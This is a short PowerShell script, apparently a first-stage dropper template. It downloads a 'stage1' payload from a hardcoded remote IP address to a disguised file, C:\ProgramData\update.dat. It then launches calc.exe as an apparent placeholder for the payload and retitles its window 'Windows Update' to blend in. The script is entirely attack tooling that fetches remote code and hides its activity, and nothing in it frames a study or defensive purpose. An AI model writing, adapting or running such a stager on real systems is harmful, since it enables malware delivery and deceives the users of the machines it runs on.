<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PayloadUrl = "http://203.0.113.151/stage1.ps1",
    [string]$DropPath = "C:\ProgramData\update.dat",
    [int]$RequestTimeout = 34
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$TransferResult = Get-Stage1Payload -SourceUrl $PayloadUrl -DestinationPath $DropPath -TimeoutSec $RequestTimeout
if ($TransferResult) {
    Start-Process -FilePath "calc.exe"
}
Start-Sleep -Seconds 8
$Host.UI.RawUI.WindowTitle = "Windows Update"
